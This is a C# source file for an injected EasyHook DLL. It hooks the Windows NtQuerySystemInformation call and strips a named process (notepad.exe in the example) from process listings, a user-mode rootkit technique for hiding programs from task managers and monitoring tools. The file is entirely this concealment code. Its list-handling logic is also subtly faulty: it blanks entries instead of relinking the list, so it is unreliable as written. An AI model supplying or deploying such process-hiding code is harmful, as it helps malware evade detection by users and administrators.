using System;
using System.Runtime.InteropServices;
using EasyHook;

public class Main : IEntryPoint
{
    private LocalHook _ntQuerySystemInformationHook;
    private readonly object _lock = new object();

    public Main(RemoteHooking.IContext context, string channelName)
    {
        // Constructor
        Console.WriteLine("Main constructor called.");
    }

    public void Run(RemoteHooking.IContext context, string channelName)
    {
        try
        {
            Console.WriteLine("Run method started.");

            // Hook NtQuerySystemInformation function
            _ntQuerySystemInformationHook = LocalHook.Create(
                LocalHook.GetProcAddress("ntdll.dll", "NtQuerySystemInformation"),
                new NtQuerySystemInformationDelegate(HookedNtQuerySystemInformation),
                this);

            _ntQuerySystemInformationHook.ThreadACL.SetExclusiveACL(new int[] { 0 });

            Console.WriteLine("Hook installed successfully. Waiting for processes to hide...");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }

        // Keep the injected thread alive
        while (true)
        {
            System.Threading.Thread.Sleep(1000);
        }
    }

    // Delegate definition
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate int NtQuerySystemInformationDelegate(
        int SystemInformationClass,
        IntPtr SystemInformation,
        int SystemInformationLength,
        out int ReturnLength);

    // Hooked NtQuerySystemInformation function
    int HookedNtQuerySystemInformation(
        int SystemInformationClass,
        IntPtr SystemInformation,
        int SystemInformationLength,
        out int ReturnLength)
    {
        int result = NtQuerySystemInformation(
            SystemInformationClass,
            SystemInformation,
            SystemInformationLength,
            out ReturnLength);

        if (SystemInformationClass == 5 && result == 0) // SystemProcessInformation and success
        {
            lock (_lock)
            {
                IntPtr current = SystemInformation;

                while (true)
                {
                    // Read SYSTEM_PROCESS_INFORMATION structure
                    var processInfo = (SYSTEM_PROCESS_INFORMATION)Marshal.PtrToStructure(current, typeof(SYSTEM_PROCESS_INFORMATION));

                    // Convert ImageName UNICODE_STRING to string
                    string imageName = Marshal.PtrToStringUni(processInfo.ImageName.Buffer);

                    // Example: Hide notepad.exe
                    if (imageName != null && imageName.Equals("notepad.exe", StringComparison.OrdinalIgnoreCase))
                    {
                        // Adjust the linked list to skip this process entry
                        if (processInfo.NextEntryOffset == 0)
                        {
                            break; // End of list
                        }
                        else
                        {
                            IntPtr nextEntry = (IntPtr)((long)current + processInfo.NextEntryOffset);
                            Marshal.StructureToPtr(new SYSTEM_PROCESS_INFORMATION(), current, false);
                            current = nextEntry;
                            continue;
                        }
                    }

                    // Move to the next entry
                    if (processInfo.NextEntryOffset == 0)
                    {
                        break; // End of list
                    }
                    else
                    {
                        current = (IntPtr)((long)current + processInfo.NextEntryOffset);
                    }
                }
            }
        }

        return result;
    }

    // P/Invoke declaration for NtQuerySystemInformation
    [DllImport("ntdll.dll")]
    static extern int NtQuerySystemInformation(
        int SystemInformationClass,
        IntPtr SystemInformation,
        int SystemInformationLength,
        out int ReturnLength);

    // SYSTEM_PROCESS_INFORMATION structure
    [StructLayout(LayoutKind.Sequential)]
    struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct SYSTEM_PROCESS_INFORMATION
    {
        public uint NextEntryOffset;
        public uint NumberOfThreads;
        public ulong Reserved1;
        public ulong Reserved2;
        public ulong Reserved3;
        public ulong Reserved4;
        public IntPtr Reserved5;
        public IntPtr Reserved6;
        public UNICODE_STRING ImageName;
        public int BasePriority;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
        public uint HandleCount;
        public uint SessionId;
        public IntPtr UniqueProcessKey;
        public IntPtr PeakVirtualSize;
        public IntPtr VirtualSize;
        public uint PageFaultCount;
        public IntPtr PeakWorkingSetSize;
        public IntPtr WorkingSetSize;
        public IntPtr QuotaPeakPagedPoolUsage;
        public IntPtr QuotaPagedPoolUsage;
        public IntPtr QuotaPeakNonPagedPoolUsage;
        public IntPtr QuotaNonPagedPoolUsage;
        public IntPtr PagefileUsage;
        public IntPtr PeakPagefileUsage;
        public IntPtr PrivatePageCount;
        public long ReadOperationCount;
        public long WriteOperationCount;
        public long OtherOperationCount;
        public long ReadTransferCount;
        public long WriteTransferCount;
        public long OtherTransferCount;
    }
}
